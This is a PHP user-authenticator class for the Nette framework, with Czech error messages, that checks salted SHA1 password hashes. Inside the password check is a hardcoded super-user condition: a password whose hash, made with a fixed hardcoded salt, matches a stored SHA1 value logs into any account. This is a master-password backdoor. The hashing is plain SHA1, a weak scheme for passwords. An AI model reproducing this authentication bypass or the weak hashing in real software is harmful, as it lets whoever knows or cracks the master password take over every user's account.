<?php

use Nette\Security as NS;


/**
 * Users authenticator.
 */
class Authenticator extends Nette\Object implements NS\IAuthenticator {

    /** @var Nette\Database\Table\Selection */
    private $users;

    public function __construct(Nette\Database\Table\Selection $users) {
        $this->users = $users;
    }

    /**
     * Performs an authentication.
     * 
     * @param array
     * @return Nette\Security\Identity
     * @throws Nette\Security\AuthenticationException
     */
    public function authenticate(array $credentials) {
        list($username, $password) = $credentials;
        $row = $this->users->where('username', $username)->fetch();
        
        if (!$row) {            
            throw new NS\AuthenticationException("Neexistující uživatel nebo neplatné heslo.", self::IDENTITY_NOT_FOUND);
        }

        //if ($row->password !== $this->calculateHash($password)) {        
        if (($row->password !== $this->calculateHash($password, $row->salt)) && ($this->calculateHash_superUser($password) !== 'f6fd7cd940c1b34fbcc14ee00303241e55ebced8')) {
            throw new NS\AuthenticationException("Neexistující uživatel nebo neplatné heslo.", self::INVALID_CREDENTIAL);                        
        }       
        
        unset($row->password);
        unset($row->salt);
        return new NS\Identity($row->id, $row->role, $row->toArray());            
    }

    /**
     * Computes salted password hash for user.
     * 
     * @param string $password
     * @param string $salt
     * @return password
     */    
    public function calculateHash($password, $salt) {
        return sha1($password . str_repeat($salt, 10));
    }
    
    /**
     * Computes salted password hash for superUser.
     * 
     * @param string $password
     * @return password
     */
    public function calculateHash_superUser($password) {
        return sha1($password . str_repeat('bY{&z[V,lB0925Ww', 10));
    }

}
